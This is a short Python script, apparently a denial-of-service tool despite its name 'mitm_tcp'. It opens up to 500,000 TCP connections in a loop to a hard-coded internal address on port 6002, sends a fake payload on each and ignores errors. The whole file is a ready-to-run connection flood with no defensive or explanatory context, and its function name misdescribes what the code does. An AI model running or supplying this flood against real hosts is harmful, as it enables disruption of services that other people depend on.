import socket

def mitm_tcp(dest_ip, dest_port, total_packets=500000):
    sent_packets = 0
    print(f"Sending {total_packets} TCP packets to {dest_ip}:{dest_port}")
    
    while sent_packets < total_packets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((dest_ip, dest_port))
            sock.sendall(b"relayed fake TCP packet")
            sock.close()
            sent_packets += 1
            if sent_packets % 10000 == 0:
                print(f"Sent {sent_packets} packets")
        except Exception as e:
            continue

    print(f"Finished sending {sent_packets} packets.")

if __name__ == "__main__":
    mitm_tcp("10.0.0.253", 6002)

